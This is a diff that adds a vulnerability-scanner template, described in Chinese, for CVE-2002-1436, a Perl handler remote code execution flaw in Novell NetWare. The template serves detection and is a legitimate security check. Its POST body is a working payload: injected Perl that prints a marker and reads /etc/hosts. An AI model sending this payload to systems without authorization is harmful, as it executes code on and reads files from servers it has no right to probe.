@@ -1,0 +1,36 @@
+[info]
+author = "ave"
+description = "通过向 Novell NetWare 5.1/6.0 的 /perl/ 路径发送特制 HTTP POST 请求，验证 Perl web handler 是否存在远程代码执行漏洞。若服务端执行嵌入的 Perl 代码并返回特征字符串，则确认漏洞存在。"
+id = "POC-AVE-2002-0588"
+name = "CVE-2002-1436 Novell NetWare Perl Handler RCE PoC"
+severity = "high"
+tags = ["ave-2002-0588"]
+vuln_id = [
+    "CVE-2002-1436",
+    "AVE-2002-0588",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "POST"
+path = "/perl/"
+protocol = "http"
+
+[poc.requests.body]
+content = """
+print "Content-type: text/html
+
+Whos your daddy
+"; open( IN, '< /etc/hosts' ) || die "Cant read /etc/hosts : $!"; while(<IN>) {print $_}; close(IN);"""
+type = "raw"
+
+[poc.requests.headers]
+Content-Type = "application/octet-stream"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["Whos your daddy"]
